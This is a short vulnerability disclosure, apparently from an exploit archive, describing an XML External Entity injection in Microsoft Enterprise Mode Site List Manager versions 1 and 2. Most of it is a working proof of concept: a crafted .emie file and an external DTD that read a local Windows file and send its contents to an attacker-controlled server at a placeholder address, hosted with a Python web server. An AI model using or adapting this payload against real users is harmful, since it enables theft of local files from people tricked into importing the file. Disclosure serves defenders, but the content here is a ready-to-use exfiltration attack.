 
Vendor
=============
www.microsoft
 
 
Product
===========
Enterprise Mode Site List Manager
versions(1/2)
 
 
You can use IE11 and the Enterprise Mode Site List Manager to add individual website domains and domain paths
and to specify whether the site renders using Enterprise Mode or the default mode.
 
 
 
Vulnerability Type
===================
XML External Entity Injection
 
 
 
CVE Reference
==============
N/A
 
 
Security Issue
================
Versions 1 and 2 of Microsoft Enterprise Mode Site List Manager allow local file exfiltration to a remote attacker controlled server, if the user is tricked
into using an attacker supplied ".emie" site list manager file type.
 
 
 
Exploit/POC
=============
1) python -m SimpleHTTPServer
 
 
 
2) POC.emie
 
<?xml version="1.0"?>  
<!DOCTYPE roottag [ 
<!ENTITY % file SYSTEM "c:\Windows\msdfmap.ini">
<!ENTITY % dtd SYSTEM "http://ADVERSARY-IP:8000/payload.dtd">
%dtd;]>
<pwn>&send;</pwn>
 
 
3) payload.dtd
 
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ADVERSARY-IP:8000?%file;'>">
%all;
 
 
Import the POC.emie into Enterprise Mode Site List Manager, then remote attackers will recieve local user files... nice.

